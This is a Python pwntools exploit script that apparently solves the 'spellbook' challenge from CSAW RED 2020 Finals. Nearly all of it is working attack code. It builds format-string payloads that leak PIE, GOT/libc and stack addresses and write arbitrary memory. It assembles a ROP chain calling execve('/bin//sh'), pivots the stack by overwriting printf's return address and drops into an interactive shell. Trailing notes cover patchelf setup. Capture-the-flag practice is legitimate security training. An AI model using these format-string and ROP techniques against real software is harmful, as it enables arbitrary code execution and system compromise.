#!/usr/bin/python2

from pwn import *
from time import sleep

local = False
if local:
    #p = process('./spellbook')
    p = process('./spellbook')#, env={"LD_PRELOAD":"/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so"})
else:
    #p = process('./spellbook_patchelfed') # The version modified with patchelf
    p = remote('localhost', 5000)
    #p = remote('pwn.red.csaw.io', 5000)

p.recvuntil("> ")

SPELLNAME_REGISTRY_OFFSET = 0x20202a # 0xc10c0 - 0xbf000
#GOT_OFFSET = 0x7b0 # puts@plt during first round of solver testing
PUTS_GOT_OFFSET = 0x201f88
PRINTF_GOT_OFFSET = 0x201f98
ACCESS_SPELLBOOK_OFFSET = 0xc52 # 0xc49 # 0xcfa
RUNCHALLENGE_LEAVE_OFFSET = 0xc50 # 0xc47 # 0xcf8

#PUTS_PTR_PTR_OFFSET = 0x7b6 # address in GOT; instruction is jump to offset [rip + 0x2017d2]
#PUTS_PTR_OFFSET = 0x7b6 + 0x2017d2
def get_GOT_addr():
    p.send("1337\n")
    p.recvuntil("at ")
    spellname_registry_addr_string = p.recv(14)
    #print("Spell name address in BSS is " + spellname_addr_string)
    SPELLNAME_REGISTRY_ADDR = int(spellname_registry_addr_string, 16)
    PUTS_GOT_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + PUTS_GOT_OFFSET
    ACCESS_SPELLBOOK_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + ACCESS_SPELLBOOK_OFFSET
    RUNCHALLENGE_LEAVE_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + RUNCHALLENGE_LEAVE_OFFSET
    #PRINTF_GOT_ADDR = SPELLNAME_REGISTRY_ADDR - SPELLNAME_REGISTRY_OFFSET + PRINTF_GOT_OFFSET
    #print("Hex of that addresss is " + hex(SPELLNAME_ADDR))
    print("Hex of GOT puts address is " + hex(PUTS_GOT_ADDR))
    print("Address of access spellbook is" + hex(ACCESS_SPELLBOOK_ADDR))
    #print("Hex of GOT printf address is " + hex(PRINTF_GOT_ADDR))
    p.recvuntil("> ")
    return(SPELLNAME_REGISTRY_ADDR, PUTS_GOT_ADDR, ACCESS_SPELLBOOK_ADDR, RUNCHALLENGE_LEAVE_ADDR)

def leak_address(read_addr, spellname_registry_addr, reset_registry_addr=True):
    if reset_registry_addr:
        payload = "%14$hhnA"
        payload += "%15$sAAA"
        payload += p64(spellname_registry_addr)
        payload += p64(read_addr)
    else:
        payload = "%14$sAAA"
        payload += "BBBBBBBB"
        payload += p64(read_addr)
    designate_spell_name(payload)
    #sleep(20)
    p.send("1337\n")
    p.recvuntil("value 1\n")
    if reset_registry_addr:
        p.recv(1) # padding byte
    addr_string = p.recv(6)
    addr = u64(addr_string + "\x00\x00")
    print("In read_addr: the address is " + hex(addr))
    #PUTS_LIBC_ADDR = int(p.recv(14),16)
    p.recvuntil("AAA") # Next three characters
    p.recvuntil("> ")
    #p.interactive()
    return(addr)

# Note this takes a byte but actually writes a short, so there will be a null byte written one byte above the destination.
def write_short(write_addr, byte, spellname_registry_addr, reset_registry_addr=True):
    bytes_written = 0
    if reset_registry_addr:
        payload = "%14$n"
        #bytes_written += 1
        space = calculate_next_fmt_string_field_width_char(bytes_written=0, target_next_byte=byte,debug=False)
        #bytes_written += space5
        payload += "%" + str(space) + "x%15$hn"
        #payload += fmtstring
        padding = "A"* (16 - len(payload))
        payload += padding
        payload += p64(spellname_registry_addr)
        payload += p64(write_addr)
    else:
        space = calculate_next_fmt_string_field_width_char(bytes_written=0, target_next_byte=byte,debug=False)
        payload = "%" + str(space) + "x%14$hn"
        padding = "A" * (16 - len(payload))
        payload += padding
        payload += p64(write_addr)
    print("In write_short: payload = " + payload)
    designate_spell_name(payload)
    #sleep(20)
    p.send("1337\n")
    p.recvuntil("value 1\n")
    #if reset_registry_addr:
    #    p.recv(1) # padding byte
    #addr_string = p.recv(6)
    #addr = u64(addr_string + "\x00\x00")
    #print("In read_addr: the address is " + hex(addr))
    #PUTS_LIBC_ADDR = int(p.recv(14),16)
    #p.recvuntil("AAA") # Next three characters
    p.recvuntil("> ")
    #p.interactive()
    return()

def write_payload(payload, addr, spellname_registry_addr):
    for i in range(len(payload)):
        write_short((addr + i), ord(payload[i]), spellname_registry_addr, reset_registry_addr=True)
    return


def calculate_next_fmt_string_field_width_char(bytes_written, target_next_byte,debug=False):
    field_width = target_next_byte - (bytes_written % 256)
    if debug:
        print("Debugging in calculate_next_fmt_string_field_width_char")
        print("bytes_written = " + hex(bytes_written))
        print("target_nex_byte = " + hex(target_next_byte))
        print("field_width = " + hex(field_width))
    if field_width < 9: # There's a minimum width and I want this to work for 32-bit and 64-bit applications
        field_width += 256
    if debug:
        print("field_width after if statement = " + hex(field_width))
    return field_width

def designate_spell_name(name):
    p.send("1\n")
    #p.recvuntil("entry: \n")
    #p.send(signature + "\n")
    p.recvuntil("cast: \n")
    p.send(name + "\n")
    p.recvuntil("> ")

def designate_invocation(invocation):
    p.send("2\n")
    #p.recvuntil("entry: \n")
    #p.send(signature + "\n")
    p.recvuntil("spell: \n")
    p.send(invocation + "\n")
    p.recvuntil("> ")


# Assumes that the GOT address is the PUTS GOT address
def leak_two_libc_addresses(PUTS_GOT_addr):
    #print("In leak_two_libc_addresses: ")
    GETCHAR_GOT_ADDR = PUTS_GOT_ADDR + 0x20 # getchar
    print("GOT_ADDR is at " + hex(PUTS_GOT_ADDR))
    payload1 = "%14$sAAA%15$sBBB"
    #payload1 += "AAAABBBBCCCCDDDD"
    #payload1 += "GGGGHHHHIIIIJJJJ"
    payload1 += p64(PUTS_GOT_ADDR)
    payload1 += p64(GETCHAR_GOT_ADDR)
    #payload1 += "%p "*((500-len(payload1))/3)
    designate_spell_name(payload1)
    #sleep(20)
    p.send("1337\n")
    #p.interactive()
    p.recvuntil("value 1\n")
    puts_libc_addr_string = p.recv(6)
    PUTS_LIBC_ADDR = u64(puts_libc_addr_string + "\x00\x00")
    print("PUTS_libc_address is " + hex(PUTS_LIBC_ADDR))
    #PUTS_LIBC_ADDR = int(p.recv(14),16)
    p.recvuntil("AAA") # Next three characters
    getchar_libc_addr_string = p.recv(6)
    GETCHAR_LIBC_ADDR = u64(getchar_libc_addr_string + "\x00\x00")
    return(PUTS_LIBC_ADDR, GETCHAR_LIBC_ADDR)

def write_long(content, dest):
    p.send("2\n")
    #p.recvuntil("entry: \n")
    #p.send("1\n")
    p.recvuntil("spell: \n")
    print("Attempting to write " + hex(content) + " to " + hex(dest) + ".")
    to_write = "0x" + "0"*(16-(len(hex(content)[2:]))) + hex(content)[2:]
    print("to_write = " + to_write)
    #p.send("%p      "*12 + "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHH\n")
    '''
    payload2 = "%34$p" + "a"*(16-6) +" "
    payload2 += "%35$p" + "b"*(16-6) +" "
    payload2 += "%36$p" + "c"*(16-6) +" "
    payload2 += "%37$p" + "d"*(16-6) +" "
    payload2 += "%38$p" + "e"*(16-6) +" "
    payload2 += "%39$p" + "f"*(16-6) +" "
    payload2 += "%40$p" + "g"*(16-6) +" "
    payload2 += "%41$p" + "h"*(16-6) +" "
    payload2 += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
    #sleep(20)
    p.send(payload2 + "\n")
    p.interactive()
    '''
    char1 = int(to_write[len(to_write)-2:],16)
    char2 = int(to_write[len(to_write)-4:len(to_write)-2],16)
    char3 = int(to_write[len(to_write)-6:len(to_write)-4],16)
    char4 = int(to_write[len(to_write)-8:len(to_write)-6],16)
    char5 = int(to_write[len(to_write)-10:len(to_write)-8],16)
    char6 = int(to_write[len(to_write)-12:len(to_write)-10],16)
    char7 = int(to_write[len(to_write)-14:len(to_write)-12],16)
    char8 = int(to_write[2:len(to_write)-14],16)

    print(hex(char1))
    print(hex(char2))
    print(hex(char3))
    print(hex(char4))
    print(hex(char5))
    print(hex(char6))
    print(hex(char7))
    print(hex(char8))
    bytes_written = 0
    fmtstring0 = "%36$hhn%37$hhn"
    payload = fmtstring0
    padding0 = "A"*(16 - len(fmtstring0))
    payload += padding0
    bytes_written += len(padding0)

    space1 = calculate_next_fmt_string_field_width_char(bytes_written, char1)
    fmtstring1 = "%" + str(space1) + "x%38$hhn"
    payload += fmtstring1
    bytes_written += space1
    padding1 = "A" * (16 - len(fmtstring1))
    payload += padding1
    bytes_written += len(padding1)

    space2 = calculate_next_fmt_string_field_width_char(bytes_written, char2)
    bytes_written += space2
    fmtstring2 = "%" + str(space2) + "x%39$hhn"
    payload += fmtstring2
    padding2 = "A"* (16 - len(fmtstring2))
    payload += padding2
    bytes_written += len(padding2)

    space3 = calculate_next_fmt_string_field_width_char(bytes_written, char3)
    bytes_written += space3
    fmtstring3 = "%" + str(space3) + "x%40$hhn"
    payload += fmtstring3
    padding3 = "A"* (16 - len(fmtstring3))
    payload += padding3
    bytes_written += len(padding3)

    space4 = calculate_next_fmt_string_field_width_char(bytes_written, char4)
    bytes_written += space4
    fmtstring4 = "%" + str(space4) + "x%41$hhn"
    payload += fmtstring4
    padding4 = "A"* (16 - len(fmtstring4))
    payload += padding4
    bytes_written += len(padding4)

    space5 = calculate_next_fmt_string_field_width_char(bytes_written, char5)
    bytes_written += space5
    fmtstring5 = "%" + str(space5) + "x%42$hhn"
    payload += fmtstring5
    padding5 = "A"* (16 - len(fmtstring5))
    payload += padding5
    bytes_written += len(padding5)

    space6 = calculate_next_fmt_string_field_width_char(bytes_written, char6)
    bytes_written += space6
    fmtstring6 = "%" + str(space6) + "x%43$hhn"
    payload += fmtstring6
    padding6 = "A"* (16 - len(fmtstring6))
    payload += padding6
    bytes_written += len(padding6)

    space7 = calculate_next_fmt_string_field_width_char(bytes_written, char7)
    bytes_written += space7
    fmtstring7 = "%" + str(space7) + "x%44$hhn"
    payload += fmtstring7
    padding7 = "A"* (16 - len(fmtstring7))
    payload += padding7
    bytes_written += len(padding7)

    space8 = calculate_next_fmt_string_field_width_char(bytes_written, char8)
    bytes_written += space8
    fmtstring8 = "%" + str(space8) + "x%45$hhn"
    payload += fmtstring8
    padding8 = "A"* (16 - len(fmtstring8))
    payload += padding8
    bytes_written += len(padding8)

    #payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT"
    #p.send(payload + "\n")
    #p.interactive()
    payload += p64(SPELLNAME_REGISTRY_ADDR-1)
    payload += p64(SPELLNAME_REGISTRY_ADDR)
    payload += p64(dest)
    payload += p64(dest+1)
    payload += p64(dest+2)
    payload += p64(dest+3)
    payload += p64(dest+4)
    payload += p64(dest+5)
    payload += p64(dest+6)
    payload += p64(dest+7)
    payload += "\n"
    #sleep(20)
    p.send(payload)
    #p.interactive()
    return

def leak_stack_address_reset_registry(spellname_registry_addr):
    payload = "%14$hhnA"
    payload += "%10$p A "
    payload += p64(spellname_registry_addr)
    designate_spell_name(payload)
    #sleep(20)
    p.send("1337\n")
    p.recvuntil("value 1\n")
    p.recv(1) # padding byte
    old_rbp_addr_string = p.recv(14)
    OLD_RBP = int(old_rbp_addr_string, 16) #u64(old_rbp_addr_string + "\x00\x00")
    print("stack address containing old rbp is " + hex(OLD_RBP))
    #p.interactive()
    return(OLD_RBP)

def leak_stack_address():
    #payload = "BBBBBBBB"
    payload = "%10$p A "
    #payload += "CCCCCCCC" #p64(spellname_registry_addr)
    designate_spell_name(payload)
    #print("Free hook is at " + hex(FREE_HOOK_ADDR))
    #sleep(20)
    p.send("1337\n")
    p.recvuntil("value 1\n")
    #p.recv(1) # padding byte
    old_rbp_addr_string = p.recv(14)
    OLD_RBP = int(old_rbp_addr_string, 16) #u64(old_rbp_addr_string + "\x00\x00")
    print("stack address containing old rbp is " + hex(OLD_RBP))
    #OLD_RBP_ADDR = OLD_RBP - 0x410
    # Calculate address of saved rbp in runRitualCasting()
    #print("location of old rbp on stack is " + hex(OLD_RBP_ADDR))
    #p.interactive()
    return(OLD_RBP)

def leak_address(read_addr, spellname_registry_addr, reset_registry_addr=True):
    if reset_registry_addr:
        payload = "%14$hhnA"
        payload += "%15$sAAA"
        payload += p64(spellname_registry_addr)
        payload += p64(read_addr)
    else:
        payload = "%14$sAAA"
        payload += "BBBBBBBB"
        payload += p64(read_addr)
    designate_spell_name(payload)
    #sleep(20)
    p.send("1337\n")
    p.recvuntil("value 1\n")
    if reset_registry_addr:
        p.recv(1) # padding byte
    addr_string = p.recv(6)
    addr = u64(addr_string + "\x00\x00")
    print("In read_addr: the address is " + hex(addr))
    p.recvuntil("AAA") # Next three characters
    p.recvuntil("> ")
    #p.interactive()
    return(addr)



SPELLNAME_REGISTRY_ADDR, PUTS_GOT_ADDR, ACCESS_SPELLBOOK_ADDR, RUNCHALLENGE_LEAVE_ADDR = get_GOT_addr()
print("PUTS_GOT adddress is " + hex(PUTS_GOT_ADDR))
print("And address of access spellbook() is " + hex(ACCESS_SPELLBOOK_ADDR))
print("And address of spellname registry is " + hex(SPELLNAME_REGISTRY_ADDR))
#PUTS_LIBC_ADDR, GETCHAR_LIBC_ADDR = leak_two_libc_addresses(PUTS_GOT_ADDR)
GETCHAR_GOT_ADDR = PUTS_GOT_ADDR + 0x20 # getchar

PUTS_LIBC_ADDR = leak_address(read_addr=PUTS_GOT_ADDR, spellname_registry_addr = SPELLNAME_REGISTRY_ADDR, reset_registry_addr=True)
print("Found puts_libc at " + hex(PUTS_LIBC_ADDR))
GETCHAR_LIBC_ADDR = leak_address(read_addr=GETCHAR_GOT_ADDR, spellname_registry_addr = SPELLNAME_REGISTRY_ADDR, reset_registry_addr=False)
print("Found getchar_libc at " + hex(GETCHAR_LIBC_ADDR))
#p.interactive()
# Next get free hook and a one gadget address.
#p.interactive()

if local:
    PUTS_OFFSET = 0x80a30
    #FREE_HOOK_OFFSET = 0x3ed8e8
    #ONE_GADGET_OFFSET = 0x10a45c
    POP_RSP_OFFSET = 0x0000000000003960 # : pop rsp ; ret
    POP_RDI_OFFSET = 0x000000000002155f #: pop rdi ; ret
    POP_RSI_OFFSET = 0x0000000000023e8a #: pop rsi ; ret
    POP_RAX_OFFSET = 0x43a78
    POP_RDX_OFFSET = 0x1b96 # pop rdx; ret
    MOV_RAX_RDX_OFFSET = 0x309cc # mov qword ptr [rdx], rax ; ret
    #XOR_RAX_OFFSET = 0xb1835 # xor rax, rax ; ret
    SYSCALL_OFFSET = 0x13c0
    #POP_RBX_OFFSET = 0x
else:
    PUTS_OFFSET = 0x68f90
    #FREE_HOOK_OFFSET = 0x3ed8e8
    #ONE_GADGET_OFFSET = 0x10a45c
    POP_RSP_OFFSET = 0x0000000000003848 #: pop rsp ; ret
    POP_RDI_OFFSET = 0x000000000001fc6a #: pop rdi ; ret
    POP_RSI_OFFSET = 0x000000000001fc1a #: pop rsi ; ret
    POP_RAX_OFFSET = 0x0000000000035fc8 #: pop rax ; ret
    POP_RDX_OFFSET = 0x0000000000001b92 #: pop rdx ; ret
    MOV_RAX_RDX_OFFSET = 0x000000000002c42c #: mov qword ptr [rdx], rax ; ret
    #XOR_RAX_OFFSET = 0xb1835 # xor rax, rax ; ret
    SYSCALL_OFFSET = 0x00000000000026c7 #: syscall
    #POP_RBX_OFFSET = 0x

LIBC_BASE = PUTS_LIBC_ADDR - PUTS_OFFSET
#FREE_HOOK_ADDR = LIBC_BASE + FREE_HOOK_OFFSET
#ONE_GADGET_ADDR = LIBC_BASE + ONE_GADGET_OFFSET
POP_RSP_ADDR = LIBC_BASE + POP_RSP_OFFSET
POP_RDI_ADDR = LIBC_BASE + POP_RDI_OFFSET
POP_RSI_ADDR = LIBC_BASE + POP_RSI_OFFSET
POP_RAX_ADDR = LIBC_BASE + POP_RAX_OFFSET
POP_RDX_ADDR = LIBC_BASE + POP_RDX_OFFSET
MOV_RAX_RDX_ADDR = LIBC_BASE + MOV_RAX_RDX_OFFSET
#XOR_RAX_ADDR = LIBC_BASE + XOR_RAX_OFFSET
SYSCALL_ADDR = LIBC_BASE + SYSCALL_OFFSET
#print("Free hook address: " + hex(FREE_HOOK_ADDR))
#print("One gadget address: " + hex(ONE_GADGET_ADDR))
print("Pop rsp address: " + hex(POP_RSP_ADDR))

#p.interactive()
# CREATE THE ROP CHAIN HERE
#def write_short(write_addr, byte, spellname_registry_addr, reset_registry_addr=True):
ROP_CHAIN_BASE_ADDR = SPELLNAME_REGISTRY_ADDR + 0xd00
print("ROP Chain base address: " + hex(ROP_CHAIN_BASE_ADDR))
#rop_chain = "ABCDEFGH"

BINSH_STRING_ADDR = ROP_CHAIN_BASE_ADDR + 0x200
rop_chain = p64(POP_RDX_ADDR)
rop_chain += p64(BINSH_STRING_ADDR)
rop_chain += p64(POP_RAX_ADDR)
rop_chain += "/bin//sh"
rop_chain += p64(MOV_RAX_RDX_ADDR)
#rop_chain += p64(POP_RDX_ADDR)
#rop_chain += p64(BINSH_STRING_ADDR + 8)
#rop_chain += p64(XOR_RAX_ADDR)
#rop_chain += p64(MOV_RAX_[RDX]_ADDR) # Don't need these four addresses, the BSS section is already null bytes
rop_chain += p64(POP_RDI_ADDR)
rop_chain += p64(BINSH_STRING_ADDR)
rop_chain += p64(POP_RSI_ADDR)
rop_chain += p64(0x0)
rop_chain += p64(POP_RDX_ADDR)
rop_chain += p64(0x0)
rop_chain += p64(POP_RAX_ADDR)
rop_chain += p64(0x3b)
rop_chain += p64(SYSCALL_ADDR)


#write_short(ROP_CHAIN_BASE_ADDR, 0x41, SPELLNAME_REGISTRY_ADDR, reset_registry_addr=True)
#write_short(ROP_CHAIN_BASE_ADDR, 0x41, SPELLNAME_REGISTRY_ADDR, reset_registry_addr=False)
write_payload(rop_chain, ROP_CHAIN_BASE_ADDR, SPELLNAME_REGISTRY_ADDR)


### Next I do two writes at once: I overwrite the free hook with the address of the first leave.

#content = ONE_GADGET_ADDR
#content = MAIN_ADDR
#dest = FREE_HOOK_ADDR

#write_long(ACCESS_SPELLBOOK_ADDR, FREE_HOOK_ADDR)
#p.interactive()
#print("FREE_HOOK Address: " + hex(FREE_HOOK_ADDR))
#print("Access Spellbook address: " + hex(ACCESS_SPELLBOOK_ADDR))

# Simulating the size of the ROP chain, want to make sure I don't run out of stack

#ROP_CHAIN_BASE_ADDR = SPELLNAME_REGISTRY_ADDR + 0xd00
#for i in range(15): # Can make it really small and jump to a one gadget if I need to because [rsp+0x70] is null
#    print("*****************")
#    print("i = " + str(i))
#    print("*****************")
#    designate_spell_name("test")
#    write_long(0x4343434343434343, (ROP_CHAIN_BASE_ADDR + 0x10+ (0x8*i)))
#    #p.interactive()

#print("ROP_CHAIN_BASE_ADDR = " + hex(ROP_CHAIN_BASE_ADDR))
#p.interactive()
# Okay, the next trick is to leak a stack address with the first printf and then overwrite free_hook to point to 
# leave from runMenu. Then the second write overwrites the saved ebp. 

# Let's start by leaking the stack address.

### Next I do two writes at once: I overwrite the free hook with the address of the first leave.
OLD_RBP_ADDR = leak_stack_address()
# I actually want to set the "name written" byte to 1
#print("One more time: old RBP address is at " + hex(OLD_RBP_ADDR))
#p.interactive()
#print("RBP for ")
#content1 = ROP_CHAIN_BASE_ADDR
#dest1 = OLD_RBP_ADDR
#content2 = RUNCHALLENGE_LEAVE_ADDR
#dest2 = FREE_HOOK_ADDR
#p.interactive()

# On the server:
# I want to write to 0x7fff125d4968, that's the return address from PRINTF_POSITIONAL
# I leaked a stack address at 0x7fff125d7bd0

if local:
    OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR = 0x32a8 # 0x30e8 if we've used the free_hook
else:
    OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR = 0x3268

PRINTF_POSITIONAL_RET_ADDR = OLD_RBP_ADDR - OFFSET_TO_PRINTF_POSITIONAL_RET_ADDR
print("printf positional return address should be at " + hex(PRINTF_POSITIONAL_RET_ADDR))


## Do two writes now! I'll also overwrite the pointers in the BSS section, not necessary in this case.
content1 = POP_RSP_ADDR
dest1 = PRINTF_POSITIONAL_RET_ADDR
content2 = ROP_CHAIN_BASE_ADDR
dest2 = PRINTF_POSITIONAL_RET_ADDR + 0x8

p.send("2\n")
p.recvuntil("spell: \n")
#p.interactive()

### First, want to figure out the offset from printf_positional saved rbp and return address to the 
### stack address I leaked. 
print("Attempting to write " + hex(content1) + " to " + hex(dest1) + " and " + hex(content2) + " to " + hex(dest2) + ".")
to_write1 = "0x" + "0"*(16-(len(hex(content1)[2:]))) + hex(content1)[2:]
to_write2 = "0x" + "0"*(16-(len(hex(content2)[2:]))) + hex(content2)[2:]
print("to_write1 = " + to_write1)
print("to_write2 = " + to_write2)

# For testing
'''
payload = "%52$s" + "a"*(16-6) +" " # was 61
payload += "%53$s" + "b"*(16-6) +" "
payload += "%54$s" + "c"*(16-6) +" "
payload += "%55$s" + "d"*(16-6) +" "
payload += "%56$s" + "e"*(16-6) +" "
payload += "%57$s" + "f"*(16-6) +" "
payload += "%58$s" + "g"*(16-6) +" "
payload += "%59$s" + "h"*(16-6) +" "
payload += "%60$s" + "i"*(16-6) +" "
payload += "%61$s" + "j"*(16-6) +" "
payload += "%62$s" + "k"*(16-6) +" "
payload += "%63$s" + "l"*(16-6) +" "
payload += "%64$s" + "m"*(16-6) +" "
payload += "%65$s" + "n"*(16-6) +" "
payload += "%66$s" + "o"*(16-6) +" "
payload += "%67$s" + "p"*(16-6) +" "
payload += "%68$s" + "q"*(16-6) +" "
payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
payload += "QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffff"
'''

char1 = int(to_write1[len(to_write1)-2:],16)
char2 = int(to_write1[len(to_write1)-4:len(to_write1)-2],16)
char3 = int(to_write1[len(to_write1)-6:len(to_write1)-4],16)
char4 = int(to_write1[len(to_write1)-8:len(to_write1)-6],16)
char5 = int(to_write1[len(to_write1)-10:len(to_write1)-8],16)
char6 = int(to_write1[len(to_write1)-12:len(to_write1)-10],16)
char7 = int(to_write1[len(to_write1)-14:len(to_write1)-12],16)
char8 = int(to_write1[2:len(to_write1)-14],16)
char9 = int(to_write2[len(to_write2)-2:],16)
char10 = int(to_write2[len(to_write2)-4:len(to_write2)-2],16)
char11 = int(to_write2[len(to_write2)-6:len(to_write2)-4],16)
char12 = int(to_write2[len(to_write2)-8:len(to_write2)-6],16)
char13 = int(to_write2[len(to_write2)-10:len(to_write2)-8],16)
char14 = int(to_write2[len(to_write2)-12:len(to_write2)-10],16)
char15 = int(to_write2[len(to_write2)-14:len(to_write2)-12],16)
char16 = int(to_write2[2:len(to_write2)-14],16)

print(hex(char1))
print(hex(char2))
print(hex(char3))
print(hex(char4))
print(hex(char5))
print(hex(char6))
print(hex(char7))
print(hex(char8))
print(hex(char9))
print(hex(char10))
print(hex(char11))
print(hex(char12))
print(hex(char13))
print(hex(char14))
print(hex(char15))
print(hex(char16))

bytes_written = 0
fmtstring0 = "%52$hhn%53$hhn"
payload = fmtstring0
padding0 = "A"*(16 - len(fmtstring0))
payload += padding0
bytes_written += len(padding0)

space1 = calculate_next_fmt_string_field_width_char(bytes_written, char1)
fmtstring1 = "%" + str(space1) + "x%54$hhn"
payload += fmtstring1
bytes_written += space1
padding1 = "A" * (16 - len(fmtstring1))
payload += padding1
bytes_written += len(padding1)

space2 = calculate_next_fmt_string_field_width_char(bytes_written, char2)
bytes_written += space2
fmtstring2 = "%" + str(space2) + "x%55$hhn"
payload += fmtstring2
padding2 = "A"* (16 - len(fmtstring2))
payload += padding2
bytes_written += len(padding2)

space3 = calculate_next_fmt_string_field_width_char(bytes_written, char3)
bytes_written += space3
fmtstring3 = "%" + str(space3) + "x%56$hhn"
payload += fmtstring3
padding3 = "A"* (16 - len(fmtstring3))
payload += padding3
bytes_written += len(padding3)

space4 = calculate_next_fmt_string_field_width_char(bytes_written, char4)
bytes_written += space4
fmtstring4 = "%" + str(space4) + "x%57$hhn"
payload += fmtstring4
padding4 = "A"* (16 - len(fmtstring4))
payload += padding4
bytes_written += len(padding4)

space5 = calculate_next_fmt_string_field_width_char(bytes_written, char5)
bytes_written += space5
fmtstring5 = "%" + str(space5) + "x%58$hhn"
payload += fmtstring5
padding5 = "A"* (16 - len(fmtstring5))
payload += padding5
bytes_written += len(padding5)

space6 = calculate_next_fmt_string_field_width_char(bytes_written, char6)
bytes_written += space6
fmtstring6 = "%" + str(space6) + "x%59$hhn"
payload += fmtstring6
padding6 = "A"* (16 - len(fmtstring6))
payload += padding6
bytes_written += len(padding6)

space7 = calculate_next_fmt_string_field_width_char(bytes_written, char7)
bytes_written += space7
fmtstring7 = "%" + str(space7) + "x%60$hhn"
payload += fmtstring7
padding7 = "A"* (16 - len(fmtstring7))
payload += padding7
bytes_written += len(padding7)

space8 = calculate_next_fmt_string_field_width_char(bytes_written, char8)
bytes_written += space8
fmtstring8 = "%" + str(space8) + "x%61$hhn"
payload += fmtstring8
padding8 = "A"* (16 - len(fmtstring8))
payload += padding8
bytes_written += len(padding8)

space9 = calculate_next_fmt_string_field_width_char(bytes_written, char9)
fmtstring9 = "%" + str(space9) + "x%62$hhn"
payload += fmtstring9
bytes_written += space9
padding9 = "A" * (16 - len(fmtstring9))
payload += padding9
bytes_written += len(padding9)

space10 = calculate_next_fmt_string_field_width_char(bytes_written, char10)
bytes_written += space10
fmtstring10 = "%" + str(space10) + "x%63$hhn"
payload += fmtstring10
padding10 = "A"* (16 - len(fmtstring10))
payload += padding10
bytes_written += len(padding10)

space11 = calculate_next_fmt_string_field_width_char(bytes_written, char11)
bytes_written += space11
fmtstring11 = "%" + str(space11) + "x%64$hhn"
payload += fmtstring11
padding11 = "A"* (16 - len(fmtstring11))
payload += padding11
bytes_written += len(padding11)

space12 = calculate_next_fmt_string_field_width_char(bytes_written, char12, debug=True)
bytes_written += space12
fmtstring12 = "%" + str(space12) + "x%65$hhn"
payload += fmtstring12
padding12 = "A"* (16 - len(fmtstring12))
payload += padding12
bytes_written += len(padding12)

space13 = calculate_next_fmt_string_field_width_char(bytes_written, char13, debug=True)
bytes_written += space13
fmtstring13 = "%" + str(space13) + "x%66$hhn"
payload += fmtstring13
padding13 = "A"* (16 - len(fmtstring13))
payload += padding13
bytes_written += len(padding13)

space14 = calculate_next_fmt_string_field_width_char(bytes_written, char14)
bytes_written += space14
fmtstring14 = "%" + str(space14) + "x%67$hhn"
payload += fmtstring14
padding14 = "A"* (16 - len(fmtstring14))
payload += padding14
bytes_written += len(padding14)

space15 = calculate_next_fmt_string_field_width_char(bytes_written, char15)
bytes_written += space15
fmtstring15 = "%" + str(space15) + "x%68$hhn"
payload += fmtstring15
padding15 = "A"* (16 - len(fmtstring15))
payload += padding15
bytes_written += len(padding15)

space16 = calculate_next_fmt_string_field_width_char(bytes_written, char16)
bytes_written += space16
fmtstring16 = "%" + str(space16) + "x%69$hhn"
payload += fmtstring16
padding16 = "A"* (16 - len(fmtstring16))
payload += padding16
bytes_written += len(padding16)

# For testing
#payload += "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP"
#payload += "QQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZaaaabbbbccccddddeeeeffff"

payload += p64(SPELLNAME_REGISTRY_ADDR - 1)
payload += p64(SPELLNAME_REGISTRY_ADDR)
payload += p64(dest1)
payload += p64(dest1+1)
payload += p64(dest1+2)
payload += p64(dest1+3)
payload += p64(dest1+4)
payload += p64(dest1+5)
payload += p64(dest1+6)
payload += p64(dest1+7)
payload += p64(dest2)
payload += p64(dest2+1)
payload += p64(dest2+2)
payload += p64(dest2+3)
payload += p64(dest2+4)
payload += p64(dest2+5)
payload += p64(dest2+6)
payload += p64(dest2+7)

#sleep(20)
p.send(payload + "\n")
p.interactive()


#### Notes follow
'''
Getting spellbook to run with the server's libc:
ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --set-rpath "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
warning: working around a Linux kernel bug by creating a hole of 2093056 bytes in 'spellbook'

Got the libc from 
https://libc.blukat.me/

Got the linker for this binary from 
https://debian.pkgs.org/9/debian-main-amd64/libc6_2.24-11+deb9u4_amd64.deb.html

Got patchelf from https://github.com/NixOS/patchelf

And ran
ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --set-interpreter "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so" --set-rpath "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
warning: working around a Linux kernel bug by creating a hole of 2093056 bytes in 'spellbook'
ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ ldd spellbook
    linux-vdso.so.1 (0x00007ffc4e2e5000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4d4773d000)
    /home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/ld-2.24.so => /lib64/ld-linux-x86-64.so.2 (0x00007f4d47d32000)
ctf@ctf:~/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook$ patchelf --add-needed "/home/ctf/Documents/NYUSEC/CSAW-RED-2020-Finals/pwn/spellbook/libc6_2.24-11+deb9u4_amd64.so" spellbook
